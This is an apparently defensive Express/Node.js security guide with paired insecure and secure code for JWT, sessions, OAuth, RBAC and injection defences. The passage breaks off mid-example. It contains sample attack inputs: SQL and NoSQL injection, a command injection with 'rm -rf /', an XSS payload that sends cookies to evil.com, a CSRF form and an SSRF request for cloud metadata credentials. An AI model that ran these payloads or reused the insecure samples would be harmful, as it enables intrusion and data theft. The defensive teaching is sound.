# Node.js/Express Backend Security Best Practices - Deep Research

> **Research Date:** 2026-05-05
> **Target:** Node.js (v18+) / Express (v4+) applications
> **Focus:** Production-ready, defense-in-depth security architecture

---

## Table of Contents

1. [Authentication Patterns](#1-authentication-patterns)
2. [Authorization Patterns](#2-authorization-patterns)
3. [Common Vulnerabilities in Express Apps](#3-common-vulnerabilities-in-express-apps)
4. [Security Headers and Middleware](#4-security-headers-and-middleware)
5. [Input Validation and Sanitization](#5-input-validation-and-sanitization)
6. [Secrets Management](#6-secrets-management)
7. [OWASP Top 10 for APIs (2023)](#7-owasp-top-10-for-apis-2023)

---

## 1. Authentication Patterns

### 1.1 JWT vs Session vs OAuth2/OIDC vs API Keys

#### JSON Web Tokens (JWT)

**When to use:**
- Stateless, distributed microservices architectures
- Cross-domain SSO scenarios
- Mobile/SPA applications where cookie storage is problematic
- Short-lived access tokens with refresh token rotation

**Security Implications:**

JWTs are **not inherently secure**; they are just signed/encoded blobs. The critical vulnerability is that a stolen JWT cannot be revoked until it expires (unless you maintain a deny-list, which defeats the stateless purpose).

**Vulnerability - Token Theft & Replay:**

If an attacker exfiltrates a JWT from localStorage (via XSS), they can replay it until expiry. Since Express is stateless by default, it has no session store to invalidate the token.

```javascript
// INSECURE: Long-lived JWT with sensitive data, no rotation
const token = jwt.sign(
  { userId: user.id, email: user.email, role: user.role, ssn: user.ssn },
  process.env.JWT_SECRET,
  { expiresIn: '30d' }  // Way too long
);
```

```javascript
// SECURE: Short-lived access token, minimal claims, refresh rotation
// access-token.service.js
const createAccessToken = (user) => {
  return jwt.sign(
    { sub: user.id, jti: crypto.randomUUID() },  // Minimal claims, unique token ID
    process.env.JWT_ACCESS_SECRET,
    { 
      expiresIn: '15m',
      issuer: 'api.myapp.com',
      audience: 'myapp.com'
    }
  );
};

// Middleware - strict validation
const authenticate = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing token' });
  }
  
  const token = authHeader.slice(7);
  
  try {
    const payload = jwt.verify(token, process.env.JWT_ACCESS_SECRET, {
      algorithms: ['HS256'],  // Explicitly allow only secure algorithms
      issuer: 'api.myapp.com',
      audience: 'myapp.com',
      clockTolerance: 30
    });
    
    // Attach minimal context
    req.userId = payload.sub;
    req.tokenJti = payload.jti;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }
};
```

**Best Practices for JWT in Express:**
1. **Never put sensitive data in JWT payload** - it's only Base64Url encoded, not encrypted
2. **Use `jti` claim** for token identification and revocation tracking
3. **Explicit `algorithms` option** in `jwt.verify()` to prevent `none` algorithm attacks
4. **Use asymmetric keys (RS256/ES256)** when multiple services need to verify tokens
5. **Store in `httpOnly`, `Secure`, `SameSite=Strict` cookies** instead of localStorage when possible
6. **Implement token binding** (optional): bind JWT to TLS session or client certificate

---

#### Session-Based Authentication

**When to use:**
- Traditional server-rendered applications (EJS, Pug)
- When immediate revocation is required (admin dashboards, banking)
- When you control the client and can use cookies effectively
- Lower complexity requirements

**Security Implications:**

Sessions require a server-side store (Redis, PostgreSQL, MongoDB). The session ID cookie becomes the attack surface.

**Vulnerability - Session Fixation & Hijacking:**

Express with `express-session` defaults to memory store in development, which is a vulnerability in production (memory leaks, no sharing across processes).

```javascript
// INSECURE: Default memory store, weak cookie settings
app.use(session({
  secret: 'keyboard cat',  // Weak secret
  resave: true,
  saveUninitialized: true   // Creates sessions for unauthenticated users (DoS vector)
}));
```

```javascript
// SECURE: Redis-backed sessions with hardened configuration
const RedisStore = require('connect-redis')(session);
const redis = require('redis');
const redisClient = redis.createClient({ 
  host: process.env.REDIS_HOST,
  password: process.env.REDIS_PASSWORD,
  tls: process.env.NODE_ENV === 'production' ? {} : undefined
});

app.use(session({
  store: new RedisStore({ client: redisClient, prefix: 'sess:' }),
  name: '__Host-sessionId',  // __Host- prefix enforces Secure, Path=/, no Domain
  secret: process.env.SESSION_SECRET,  // 32+ byte random, rotated regularly
  resave: false,
  saveUninitialized: false,  // Don't create sessions until login
  cookie: {
    secure: true,           // HTTPS only
    httpOnly: true,         // No JavaScript access
    sameSite: 'strict',     // CSRF protection
    maxAge: 24 * 60 * 60 * 1000,  // 24 hours
    domain: undefined       // Host-only cookie
  },
  genid: () => {
    return crypto.randomBytes(32).toString('hex');  // CSPRNG session IDs
  }
}));

// Regenerate session ID on privilege escalation (login)
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  
  // CRITICAL: Regenerate to prevent session fixation
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Session error' });
    
    req.session.userId = user.id;
    req.session.loginIp = req.ip;
    req.session.loginTime = Date.now();
    req.session.userAgentHash = crypto
      .createHash('sha256')
      .update(req.headers['user-agent'] || '')
      .digest('hex');
    
    req.session.save((err) => {
      if (err) return res.status(500).json({ error: 'Session error' });
      res.json({ success: true });
    });
  });
});

// Session validation middleware - bind to device fingerprint
const validateSession = (req, res, next) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  const currentUaHash = crypto
    .createHash('sha256')
    .update(req.headers['user-agent'] || '')
    .digest('hex');
    
  if (currentUaHash !== req.session.userAgentHash) {
    // Potential session hijacking - destroy and require re-auth
    req.session.destroy();
    return res.status(401).json({ error: 'Session invalidated' });
  }
  
  next();
};
```

---

#### OAuth2 / OpenID Connect (OIDC)

**When to use:**
- Third-party identity providers (Google, GitHub, corporate SSO)
- Federation across organizational boundaries
- When you don't want to store passwords
- B2B SaaS applications

**Security Implications:**

OAuth2 is an **authorization framework**, not an authentication protocol. OIDC adds the identity layer on top. Misunderstanding this distinction leads to critical vulnerabilities.

**Vulnerability - Authorization Code Interception (Public Clients):**

In SPAs and mobile apps, the client secret cannot be confidential. Without PKCE, an attacker who intercepts the authorization code can exchange it for tokens.

**Latest OAuth 2.1 and PKCE Requirements:**

OAuth 2.1 (draft-ietf-oauth-v2-1) makes several breaking changes from OAuth 2.0:

1. **PKCE is REQUIRED for ALL clients**, not just public clients
2. **Implicit grant is REMOVED** (use Authorization Code + PKCE)
3. **Password grant is REMOVED**
4. **Refresh tokens must be sender-constrained or rotated**
5. **Exact redirect URI matching is REQUIRED** (no partial matching)
6. **Bearer tokens in URI query strings are PROHIBITED**

```javascript
// SECURE: Authorization Code + PKCE flow (Express backend)
const crypto = require('crypto');
const { generators, Issuer } = require('openid-client');

// PKCE: Proof Key for Code Exchange
// Step 1: Generate code_verifier and code_challenge
const generatePKCE = () => {
  const codeVerifier = generators.codeVerifier();
  const codeChallenge = generators.codeChallenge(codeVerifier);
  return { codeVerifier, codeChallenge };
};

// Express routes
app.get('/auth/oauth/start', (req, res) => {
  const { codeVerifier, codeChallenge } = generatePKCE();
  
  // Store code_verifier in session (server-side only)
  req.session.oauth = {
    codeVerifier,
    state: generators.state(),  // CSRF protection
    nonce: generators.nonce(),  // Replay attack protection
    redirectUri: `${process.env.BASE_URL}/auth/oauth/callback`
  };
  
  const authorizationUrl = client.authorizationUrl({
    scope: 'openid email profile',
    code_challenge: codeChallenge,
    code_challenge_method: 'S256',
    state: req.session.oauth.state,
    nonce: req.session.oauth.nonce
  });
  
  res.redirect(authorizationUrl);
});

app.get('/auth/oauth/callback', async (req, res) => {
  const params = client.callbackParams(req);
  
  try {
    // Validate state parameter (CSRF protection)
    if (params.state !== req.session.oauth.state) {
      throw new Error('Invalid state parameter');
    }
    
    const tokenSet = await client.callback(
      req.session.oauth.redirectUri,
      params,
      {
        code_verifier: req.session.oauth.codeVerifier,
        state: req.session.oauth.state,
        nonce: req.session.oauth.nonce  // Validates id_token nonce claim
      }
    );
    
    // Validate ID token claims
    const claims = tokenSet.claims();
    if (claims.iss !== expectedIssuer) throw new Error('Invalid issuer');
    if (claims.aud !== clientId) throw new Error('Invalid audience');
    if (claims.exp < Date.now() / 1000) throw new Error('Token expired');
    
    // Create local session or JWT
    req.session.userId = await findOrCreateUser(claims);
    
    // Clear OAuth temp data
    delete req.session.oauth;
    
    res.redirect('/dashboard');
  } catch (err) {
    console.error('OAuth callback error:', err);
    res.redirect('/login?error=oauth_failed');
  }
});
```

**OIDC Security Checklist:**
- [ ] Always validate `state` parameter
- [ ] Always validate `nonce` in ID tokens
- [ ] Verify `iss`, `aud`, `exp` claims in ID tokens
- [ ] Use exact redirect URI matching (no wildcards)
- [ ] Store tokens server-side, never expose refresh tokens to browser
- [ ] Implement front-channel logout (OIDC RP-Initiated Logout)

---

#### API Keys

**When to use:**
- Server-to-server authentication
- Internal microservices communication
- Long-lived automation/scripts
- Webhook verification

**Security Implications:**

API keys are **long-term credentials**. If leaked, they provide persistent access until manually revoked.

**Vulnerability - Key Exposure in Logs/URLs:**

```javascript
// INSECURE: API key in query parameter, logged by proxy
app.get('/api/data', (req, res) => {
  const key = req.query.api_key;  // Appears in access logs, browser history
  // ...
});
```

```javascript
// SECURE: API key with prefix, hashing, and scoped permissions
const API_KEY_PREFIX = 'ak_live_';

// Generate API key (store only hash in DB)
const generateApiKey = () => {
  const key = API_KEY_PREFIX + crypto.randomBytes(32).toString('base64url');
  const hash = crypto.createHash('sha256').update(key).digest('hex');
  return { key, hash };  // Return key once to user, store hash only
};

// Middleware
const authenticateApiKey = async (req, res, next) => {
  const key = req.headers['x-api-key'];
  if (!key || !key.startsWith(API_KEY_PREFIX)) {
    return res.status(401).json({ error: 'Invalid API key format' });
  }
  
  const hash = crypto.createHash('sha256').update(key).digest('hex');
  const apiKeyRecord = await db.apiKeys.findByHash(hash);
  
  if (!apiKeyRecord) {
    return res.status(401).json({ error: 'Invalid API key' });
  }
  
  if (apiKeyRecord.expiresAt && apiKeyRecord.expiresAt < new Date()) {
    return res.status(401).json({ error: 'API key expired' });
  }
  
  if (apiKeyRecord.revokedAt) {
    return res.status(401).json({ error: 'API key revoked' });
  }
  
  // Scope validation
  const requiredScope = `${req.method.toLowerCase()}:${req.baseUrl}`;
  if (!apiKeyRecord.scopes.includes(requiredScope) && !apiKeyRecord.scopes.includes('*')) {
    return res.status(403).json({ error: 'Insufficient scope' });
  }
  
  // Rate limiting by key
  const limit = await rateLimiter.consume(apiKeyRecord.id, 1);
  if (!limit) {
    return res.status(429).json({ error: 'Rate limit exceeded' });
  }
  
  req.apiKeyId = apiKeyRecord.id;
  req.apiKeyScopes = apiKeyRecord.scopes;
  next();
};
```

---

### 1.2 Password Hashing: bcrypt vs argon2

**Why NOT MD5/SHA1/SHA256:**

Password hashing requires algorithms that are **deliberately slow** and **memory-hard**. MD5/SHA1 are general-purpose hash functions designed for speed, making them trivial to crack with GPUs:

- MD5: ~200 GH/s on RTX 4090
- SHA1: ~100 GH/s on RTX 4090  
- bcrypt: ~50 kH/s on RTX 4090 (4 million times slower)
- argon2id: ~1 kH/s (with high memory cost)

**Bcrypt Details:**

- Based on Blowfish cipher, cost factor (work factor) logarithmic
- Default cost of 10 = 2^10 iterations (~100ms on modern CPU)
- Hard limit of 72 bytes input (truncate long passwords!)
- Pre-hashes with SHA256 if longer passwords needed

```javascript
const bcrypt = require('bcrypt');

// SECURE: bcrypt with cost factor 12+
const SALT_ROUNDS = 12;  // ~250ms/hash in 2025, adjust based on your infra

const hashPassword = async (password) => {
  return bcrypt.hash(password, SALT_ROUNDS);
};

const verifyPassword = async (password, hash) => {
  // Constant-time comparison built into bcrypt.compare
  return bcrypt.compare(password, hash);
};
```

**Argon2 (Recommended):**

Winner of the Password Hashing Competition (2015). Three variants:
- **Argon2d**: Memory-hard, GPU-resistant, side-channel vulnerable
- **Argon2i**: Memory-hard, side-channel resistant
- **Argon2id**: Hybrid (recommended by OWASP)

```javascript
const argon2 = require('argon2');

// SECURE: Argon2id with OWASP-recommended parameters (2023)
const hashPassword = async (password) => {
  return argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 65536,    // 64 MB
    timeCost: 3,          // 3 iterations
    parallelism: 4,       // 4 parallel threads
    saltLength: 16,       // 128-bit salt
    hashLength: 32        // 256-bit output
  });
};

const verifyPassword = async (password, hash) => {
  try {
    return await argon2.verify(hash, password);
  } catch (err) {
    // Never expose whether error was from verification or parsing
    return false;
  }
};
```

**OWASP Password Storage Cheat Sheet (2023) Priority:**
1. **Argon2id** (if available)
2. **scrypt** (if Argon2 unavailable)
3. **bcrypt** (if scrypt unavailable)
4. PBKDF2 (only if FIPS compliance required)

---

### 1.3 Refresh Token Patterns and Rotation

**The Problem:**

Long-lived refresh tokens are high-value targets. If stolen, they grant persistent access. Simple refresh token implementations allow replay attacks.

**Refresh Token Rotation:**

When a refresh token is used, it is invalidated and replaced with a new one. If an attacker steals an old refresh token and tries to use it, the legitimate user will be signed out (detected by reuse).

```javascript
// SECURE: Refresh token rotation with reuse detection
// Schema: refresh_tokens(id, user_id, token_hash, family, issued_at, expires_at, revoked_at, replaced_by)

const createRefreshToken = async (userId) => {
  const token = crypto.randomBytes(64).toString('base64url');
  const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
  const family = crypto.randomUUID();  // Token family for rotation chain
  
  await db.refreshTokens.create({
    userId,
    tokenHash,
    family,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)  // 7 days
  });
  
  return token;
};

const rotateRefreshToken = async (incomingToken) => {
  const incomingHash = crypto.createHash('sha256').update(incomingToken).digest('hex');
  
  const storedToken = await db.refreshTokens.findByHash(incomingHash);
  
  // Validate token exists and is active
  if (!storedToken || storedToken.revokedAt || storedToken.expiresAt < new Date()) {
    throw new Error('Invalid refresh token');
  }
  
  // Check if already used (reuse detection)
  if (storedToken.replacedBy) {
    // SECURITY EVENT: Token reuse detected!
    // Attacker has a stolen token. Invalidate entire family.
    await db.refreshTokens.revokeFamily(storedToken.family);
    await securityLogger.alert('refresh_token_reuse', { 
      userId: storedToken.userId,
      family: storedToken.family 
    });
    throw new Error('Token reuse detected - session invalidated');
  }
  
  // Generate new token pair
  const newAccessToken = createAccessToken(storedToken.userId);
  const newRefreshToken = await createRefreshToken(storedToken.userId);
  const newRefreshHash = crypto.createHash('sha256').update(newRefreshToken).digest('hex');
  
  // Mark old as replaced, link to new
  await db.refreshTokens.update(storedToken.id, {
    replacedBy: newRefreshHash,
    usedAt: new Date()
  });
  
  return { accessToken: newAccessToken, refreshToken: newRefreshToken };
};
```

**Additional Refresh Token Security:**
- Bind to device fingerprint (IP, User-Agent hash)
- Absolute maximum lifetime (e.g., 30 days regardless of rotation)
- Concurrent session limits per user
- Admin-initiated revocation of all sessions

---

## 2. Authorization Patterns

### 2.1 RBAC vs ABAC vs ReBAC

#### Role-Based Access Control (RBAC)

**Concept:** Permissions assigned to roles, users assigned to roles.

**Best for:** Hierarchical organizations with clear job functions.

```javascript
// Schema: roles(name), permissions(resource, action), role_permissions, user_roles

// Express middleware
const requireRole = (...allowedRoles) => {
  return (req, res, next) => {
    if (!req.user?.roles?.some(role => allowedRoles.includes(role))) {
      return res.status(403).json({ error: 'Insufficient role' });
    }
    next();
  };
};

app.delete('/api/users/:id', 
  authenticate,
  requireRole('admin', 'superadmin'),
  deleteUserHandler
);
```

**Limitations:**
- Role explosion in complex systems
- Cannot express "user can edit their own profile but not others"
- Static; doesn't adapt to context

---

#### Attribute-Based Access Control (ABAC)

**Concept:** Decisions based on attributes of subject, resource, action, and environment.

**Best for:** Dynamic, context-aware authorization.

```javascript
// Policy: User can access document if:
//   user.department == document.department AND
//   user.clearance >= document.classification AND
//   time.hour between 9 and 17 AND
//   request.ip in allowed_ranges

const evaluateABAC = async (subject, resource, action, environment) => {
  const policies = await db.policies.find({ resourceType: resource.type });
  
  for (const policy of policies) {
    const result = await evaluatePolicy(policy, { subject, resource, action, environment });
    if (result.effect === 'deny') return false;
    if (result.effect === 'allow') return true;
  }
  
  return false;  // Default deny
};

// Middleware factory
const authorize = (resourceType, action) => {
  return async (req, res, next) => {
    const subject = await getUserAttributes(req.userId);
    const resource = await getResourceAttributes(req.params);
    const environment = {
      ip: req.ip,
      time: new Date(),
      userAgent: req.headers['user-agent']
    };
    
    const permitted = await evaluateABAC(subject, resource, action, environment);
    if (!permitted) {
      return res.status(403).json({ error: 'Access denied by policy' });
    }
    next();
  };
};

app.get('/api/documents/:id',
  authenticate,
  authorize('document', 'read'),
  getDocumentHandler
);
```

---

#### Relationship-Based Access Control (ReBAC)

**Concept:** Permissions derived from relationships between entities (inspired by Google Zanzibar).

**Best for:** Complex sharing models (Google Drive, Facebook).

```javascript
// Example: document#owner@alice (alice is owner of document)
//          document#editor@bob (bob is editor of document)
//          folder#parent@document (document is in folder)
//          folder#viewer@folder#parent (viewers of folder are viewers of children)

// Simplified ReBAC implementation
const checkRelation = async (object, relation, user) => {
  // Direct relation
  const direct = await db.tuples.find({ object, relation, user });
  if (direct) return true;
  
  // Indirect through userset (e.g., object#editor@object#owner)
  const usersets = await db.tuples.find({ object, relation, userset: { $exists: true } });
  for (const us of usersets) {
    if (await checkRelation(us.userset.object, us.userset.relation, user)) {
      return true;
    }
  }
  
  // Indirect through parent (e.g., folder contains document)
  const parents = await db.tuples.find({ object, relation: 'parent' });
  for (const parent of parents) {
    // Check if user has relation on parent
    if (await checkRelation(parent.userset.object, relation, user)) {
      return true;
    }
  }
  
  return false;
};
```

**Production ReBAC:** Use dedicated services like **OpenFGA**, **AuthZed**, or **Google Cloud IAM** instead of rolling your own.

---

### 2.2 Middleware vs Decorator vs Policy-Based Authorization

#### Middleware-Based (Express-native)

```javascript
// Pro: Simple, composable, Express-native
// Con: Hard to test in isolation, scattered policy logic

const authorize = (permission) => {
  return async (req, res, next) => {
    const hasPermission = await checkPermission(req.userId, permission);
    if (!hasPermission) return res.status(403).send();
    next();
  };
};

app.put('/api/posts/:id', authenticate, authorize('post:update'), updatePost);
```

#### Decorator-Based (with experimental decorators or wrapper functions)

```javascript
// Pro: Declarative, colocated with handler
// Con: Requires transpilation or wrapper pattern

const authorize = (permission) => (handler) => {
  return async (req, res, next) => {
    const hasPermission = await checkPermission(req.userId, permission);
    if (!hasPermission) return res.status(403).send();
    return handler(req, res, next);
  };
};

const updatePost = authorize('post:update')(async (req, res) => {
  // handler logic
});
```

#### Policy-Based (Centralized Policy Engine)

```javascript
// Pro: Centralized, auditable, can be updated at runtime
// Con: More complex, potential performance overhead

// policies.js
module.exports = {
  'post:update': {
    description: 'Update a post',
    check: async (subject, resource) => {
      return subject.id === resource.authorId || subject.role === 'moderator';
    }
  }
};

// policy-engine.js
class PolicyEngine {
  async evaluate(policyName, subject, resource) {
    const policy = this.policies[policyName];
    if (!policy) throw new Error(`Unknown policy: ${policyName}`);
    
    const startTime = Date.now();
    const result = await policy.check(subject, resource);
    const duration = Date.now() - startTime;
    
    await this.auditLog.log({ policyName, subject, resource, result, duration });
    return result;
  }
}
```

**Recommendation for Express:**
- Start with **middleware-based RBAC** for simplicity
- Evolve to **policy-based ABAC** as complexity grows
- Consider **ReBAC** only if you have complex sharing requirements (use OpenFGA)

---

## 3. Common Vulnerabilities in Express Apps

### 3.1 Injection Attacks

#### SQL Injection

**The Vulnerability:**

Express apps using raw string concatenation in SQL queries are trivially exploitable.

**Attack:**

```
GET /api/users?name=admin' UNION SELECT username,password FROM users--
```

**Impact:** Complete database exfiltration, authentication bypass, data manipulation.

```javascript
// INSECURE: String concatenation
app.get('/api/users', async (req, res) => {
  const { name } = req.query;
  const result = await db.query(`SELECT * FROM users WHERE name = '${name}'`);
  res.json(result.rows);
});
```

```javascript
// SECURE: Parameterized queries with pg
const { Pool } = require('pg');
const pool = new Pool();

app.get('/api/users', async (req, res) => {
  const { name } = req.query;
  const result = await pool.query(
    'SELECT * FROM users WHERE name = $1',
    [name]  // Properly escaped and type-safe
  );
  res.json(result.rows);
});

// SECURE: Using Prisma ORM (query builder)
app.get('/api/users', async (req, res) => {
  const users = await prisma.user.findMany({
    where: { name: req.query.name }  // Auto-parameterized
  });
  res.json(users);
});
```

---

#### NoSQL Injection

**The Vulnerability:**

MongoDB's query operators (`$gt`, `$ne`, `$where`) can be injected if user input is passed directly to query objects.

**Attack:**

```json
POST /api/login
{
  "username": { "$ne": null },
  "password": { "$ne": null }
}
```

**Impact:** Authentication bypass, unauthorized data access.

```javascript
// INSECURE: Direct object pass-through
app.post('/api/login', async (req, res) => {
  const user = await db.collection('users').findOne(req.body);
  if (user) {
    req.session.userId = user._id;
    res.json({ success: true });
  }
});
```

```javascript
// SECURE: Explicit schema validation and typed queries
const { body, validationResult } = require('express-validator');

app.post('/api/login',
  body('username').isString().trim().isLength({ min: 3 }).escape(),
  body('password').isString().isLength({ min: 8 }),
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    const { username, password } = req.body;
    
    // Explicit query object - no operator injection possible
    const user = await db.collection('users').findOne({
      username: username  // String value only
    });
    
    if (!user || !(await verifyPassword(password, user.passwordHash))) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    req.session.userId = user._id;
    res.json({ success: true });
  }
);
```

---

#### Command Injection

**The Vulnerability:**

Passing user input to `child_process.exec()`, `eval()`, or system calls.

**Attack:**

```
GET /api/convert?url=http://example.com;rm -rf /
```

```javascript
// INSECURE: User input in shell command
const { exec } = require('child_process');

app.get('/api/convert', (req, res) => {
  const { url } = req.query;
  exec(`wkhtmltopdf ${url} output.pdf`, (err) => {
    if (err) return res.status(500).send();
    res.download('output.pdf');
  });
});
```

```javascript
// SECURE: Use execFile with array arguments (no shell interpretation)
const { execFile } = require('child_process');
const { URL } = require('url');

app.get('/api/convert', async (req, res) => {
  let parsedUrl;
  try {
    parsedUrl = new URL(req.query.url);
    // Whitelist allowed protocols
    if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
      throw new Error('Invalid protocol');
    }
  } catch {
    return res.status(400).json({ error: 'Invalid URL' });
  }
  
  execFile('wkhtmltopdf', [parsedUrl.href, 'output.pdf'], (err) => {
    if (err) return res.status(500).send();
    res.download('output.pdf');
  });
});

// EVEN BETTER: Use dedicated libraries instead of shelling out
const puppeteer = require('puppeteer');
// Or use a sandboxed worker process with seccomp
```

---

#### Cross-Site Scripting (XSS)

**The Vulnerability:**

User input rendered in HTML without proper encoding. Express doesn't auto-escape output by default.

**Types:**
- **Stored XSS**: Malicious script stored in database, served to all users
- **Reflected XSS**: Malicious script in URL, reflected in immediate response
- **DOM-based XSS**: Client-side JavaScript unsafely writes user input to DOM

**Attack:**

```
POST /api/comments
{"text": "<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>"}
```

```javascript
// INSECURE: Rendering user input without escaping
app.get('/api/comments', async (req, res) => {
  const comments = await db.comments.findAll();
  const html = comments.map(c => `<p>${c.text}</p>`).join('');
  res.send(html);  // If text contains <script>, it executes!
});
```

```javascript
// SECURE: Server-side escaping with template engines
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

// Better: Use auto-escaping template engine
app.set('view engine', 'pug');  // Auto-escapes by default

// Even better: Don't render HTML from API; return JSON and let client handle
app.get('/api/comments', async (req, res) => {
  const comments = await db.comments.findAll();
  res.json({ comments });  // Client uses React/Vue with auto-escaping
});
```

**Content Security Policy (CSP) as Defense-in-Depth:**

```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`],
    styleSrc: ["'self'", "'unsafe-inline'"],  // Minimize unsafe-inline
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.myapp.com"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],  // No Flash/PDF
    frameAncestors: ["'none'"],  // Clickjacking protection
    baseUri: ["'self'"],
    formAction: ["'self'"]
  }
}));
```

---

### 3.2 CSRF, SSRF, IDOR

#### Cross-Site Request Forgery (CSRF)

**The Vulnerability:**

An attacker tricks a logged-in user into making an unintended request to your Express app. Since the browser automatically sends cookies, the request appears authenticated.

**Attack:**

```html
<!-- On attacker's site -->
<form action="https://bank.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**Why Express is Vulnerable:**

Express doesn't validate the origin of requests by default. Without explicit CSRF protection, any site can POST to your API if the user has an active session cookie.

```javascript
// INSECURE: No CSRF protection on state-changing endpoints
app.post('/api/transfer', authenticate, async (req, res) => {
  await transferFunds(req.session.userId, req.body.to, req.body.amount);
  res.json({ success: true });
});
```

```javascript
// SECURE: Double-submit cookie pattern with csurf
const csrf = require('csurf');

// For traditional form submissions
app.use(csrf({ cookie: { httpOnly: true, secure: true, sameSite: 'strict' } }));

app.use((req, res, next) => {
  res.locals.csrfToken = req.csrfToken();
  next();
});

// For API/SPA: Custom header validation (cannot be set by cross-origin forms)
app.use((req, res, next) => {
  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
    const origin = req.headers.origin;
    const allowedOrigins = ['https://app.myapp.com', 'https://admin.myapp.com'];
    
    if (!origin || !allowedOrigins.includes(origin)) {
      return res.status(403).json({ error: 'Invalid origin' });
    }
    
    // Custom header that cross-origin requests cannot set
    if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
      return res.status(403).json({ error: 'Missing custom header' });
    }
  }
  next();
});

// SameSite=Strict cookies are the strongest defense
app.use(session({
  // ... session config ...
  cookie: { sameSite: 'strict', secure: true, httpOnly: true }
}));
```

---

#### Server-Side Request Forgery (SSRF)

**The Vulnerability:**

The server makes HTTP requests based on user input. An attacker can force the server to request internal services, cloud metadata endpoints, or restricted networks.

**Attack:**

```
POST /api/webhook
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role"}
```

**Impact:** Cloud credential theft, internal API access, port scanning from server.

```javascript
// INSECURE: Fetching arbitrary URLs
const axios = require('axios');

app.post('/api/webhook', async (req, res) => {
  const { url } = req.body;
  const response = await axios.get(url);  // Can hit internal services!
  res.json(response.data);
});
```

```javascript
// SECURE: URL validation, DNS resolution check, block private IPs
const { URL } = require('url');
const dns = require('dns').promises;
const net = require('net');

const BLOCKED_IP_RANGES = [
  '127.0.0.0/8',      // Loopback
  '10.0.0.0/8',       // Private
  '172.16.0.0/12',    // Private
  '192.168.0.0/16',   // Private
  '169.254.0.0/16',   // Link-local (cloud metadata!)
  '0.0.0.0/8',
  '::1/128',          // IPv6 loopback
  'fc00::/7',         // IPv6 private
  'fe80::/10'         // IPv6 link-local
];

const isPrivateIP = (ip) => {
  // Implement CIDR matching or use 'ip-address' npm package
  const { Address4, Address6 } = require('ip-address');
  try {
    const addr = net.isIPv6(ip) ? new Address6(ip) : new Address4(ip);
    return BLOCKED_IP_RANGES.some(range => addr.isInSubnet(new (net.isIPv6(ip) ? Address6 : Address4)(range.replace(/\/\d+/, ''))));
  } catch {
    return true;  // Block on parse error
  }
};

const safeFetch = async (userUrl) => {
  // 1. Parse URL
  let parsed;
  try {
    parsed = new URL(userUrl);
  } catch {
    throw new Error('Invalid URL');
  }
  
  // 2. Whitelist protocols
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Only HTTP/HTTPS allowed');
  }
  
  // 3. Resolve DNS and check IP
  const addresses = await dns.resolve4(parsed.hostname);
  for (const ip of addresses) {
    if (isPrivateIP(ip)) {
      throw new Error('Private IP addresses not allowed');
    }
  }
  
  // 4. Use request library that doesn't follow redirects to private IPs
  const axios = require('axios');
  const response = await axios.get(userUrl, {
    maxRedirects: 0,  // Handle redirects manually to re-validate
    timeout: 5000,
    responseType: 'text',
    maxBodyLength: 1024 * 1024  // 1MB limit
  });
  
  return response.data;
};
```

---

#### Insecure Direct Object Reference (IDOR)

**The Vulnerability:**

An attacker can access or modify resources they don't own by changing an identifier in the request.

**Attack:**

```
GET /api/invoices/12345  --> Works, user owns invoice 12345
GET /api/invoices/12346  --> Works! User can see someone else's invoice
```

**Why Express is Vulnerable:**

Express route parameters are just strings. There's no built-in ownership validation.

```javascript
// INSECURE: No ownership check
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await db.invoices.findById(req.params.id);
  res.json(invoice);  // Any authenticated user can access any invoice!
});
```

```javascript
// SECURE: Always enforce authorization at the data layer
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  // Option 1: Filter by userId in query
  const invoice = await db.invoices.findOne({
    where: {
      id: req.params.id,
      userId: req.userId  // Enforce ownership at DB level
    }
  });
  
  if (!invoice) {
    return res.status(404).json({ error: 'Invoice not found' });
  }
  
  res.json(invoice);
});

// SECURE: Even better - use policy engine for complex ownership
app.get('/api/teams/:teamId/invoices/:id', authenticate, async (req, res) => {
  const { teamId, id } = req.params;
  
  // Check if user is member of team (ReBAC/ABAC)
  const membership = await db.teamMembers.findOne({
    where: { teamId, userId: req.userId }
  });
  
  if (!membership) {
    return res.status(404).json({ error: 'Not found' });  // 404 not 403 to prevent ID enumeration
  }
  
  const invoice = await db.invoices.findOne({
    where: { id, teamId }  // Both constraints
  });
  
  if (!invoice) {
    return res.status(404).json({ error: 'Not found' });
  }
  
  res.json(invoice);
});
```

**Key Principle:** Never trust the client to provide valid object IDs. Always verify the authenticated subject has authorization to access that specific resource.

---

### 3.3 Race Conditions in Stateful Operations

**The Vulnerability:**

Node.js is single-threaded but I/O is asynchronous. Concurrent requests can interleave, causing state corruption.

**Example - Double Spend:**

```javascript
// INSECURE: Check-then-act race condition
app.post('/api/withdraw', authenticate, async (req, res) => {
  const { amount } = req.body;
  
